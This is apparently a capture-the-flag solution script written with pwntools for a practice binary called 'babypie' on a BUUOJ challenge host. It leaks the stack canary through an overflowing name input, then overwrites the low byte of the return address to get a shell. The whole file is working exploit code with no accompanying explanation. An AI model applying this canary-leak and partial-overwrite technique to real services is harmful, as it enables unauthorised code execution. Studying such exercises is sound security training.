from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('babypie')
io = remote('node4.buuoj.cn', 26569)
# libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so')
# libc = ELF('libc-2.29.so')
elf = ELF('babypie')


payload = b'a' * 0x29
io.sendafter('Input your Name:\n', payload)
io.recvuntil('a' * 0x29)
canary = u64(b'\x00' + io.recvn(7))
log.success('canary: ' + hex(canary))

# gdb.attach(io)
payload = b'a' * 0x28 + p64(canary) + b'a' * 8 + b'\x3e'
io.sendafter('\n', payload)
# pause()
io.interactive()
